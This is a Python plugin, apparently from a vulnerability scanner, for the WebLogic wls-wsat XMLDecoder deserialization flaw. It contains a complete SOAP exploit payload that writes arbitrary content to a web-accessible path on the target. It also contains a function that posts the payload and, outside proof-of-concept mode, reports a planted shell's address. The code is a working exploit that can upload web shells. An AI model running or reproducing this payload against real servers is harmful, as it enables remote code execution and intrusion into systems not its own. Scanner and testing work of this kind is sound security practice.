# -*- coding:utf-8 -*-
# weblogic_XML反序列化

from .. import requestUtil
from ServiceScanModel.models import ServiceScan

xml_payload = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter"> 
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/{file}</string>
    <void method="println">
<string>
    {content}
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
'''

def xml_deserialize(url, file, content, type="poc"):
    payload = xml_payload.format(file=file, content=content)
    requestUtil.post(url + "/wls-wsat/CoordinatorPortType", header={"Content-Type": "text/xml"},
                     data=payload)
    if type == "poc":
        resp = requestUtil.get(url + "/bea_wls_internal/%s"%file)
        if content in resp.text:
            return ["weblogic_XML反序列化", 'Path: /bea_wls_internal/passerW.txt<br>Content: passer-W']
    else:
        return "上传成功，shell地址：\n%s"%(url+"/bea_wls_internal/%s"%file)


def fingerprint(service):
    if service.url:
        resp = requestUtil.get(service.url+"/wls-wsat/CoordinatorPortType")
        if resp.status_code == 200:
            return True


def poc(service: ServiceScan):
    try:
        return xml_deserialize(service.url, "passerW.txt", "passer-W")
    except:
        return []
